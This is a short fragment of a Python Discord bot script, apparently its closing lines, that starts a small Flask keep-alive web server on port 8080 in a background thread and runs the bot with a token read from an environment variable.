@app.route('/')
def main():
    return f"Logged in as {bot.user}."

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    server = Thread(target=run)
    server.start()

keep_alive()


bot.run(os.getenv('TOKEN'))
